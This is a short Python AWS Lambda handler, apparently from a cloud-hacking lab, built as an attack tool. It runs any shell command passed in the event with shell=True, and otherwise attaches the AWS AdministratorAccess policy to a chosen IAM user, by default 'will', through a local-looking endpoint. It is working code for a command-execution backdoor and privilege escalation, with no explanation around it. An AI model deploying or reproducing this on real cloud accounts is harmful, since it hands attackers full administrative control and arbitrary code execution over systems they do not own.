import json
import os
import subprocess
import boto3

def lambda_handler(event, context):
    cmd = event.get("cmd")
    if cmd:
        return subprocess.check_output(cmd, shell=True, text=True)
    endpoint = os.environ.get("AWS_ENDPOINT_URL", "http://cloud.amzcorp.local")
    user = event.get("user", "will")
    iam = boto3.client("iam", endpoint_url=endpoint)
    iam.attach_user_policy(
        UserName=user,
        PolicyArn="arn:aws:iam::aws:policy/AdministratorAccess",
    )
    return json.dumps({"attached": user})
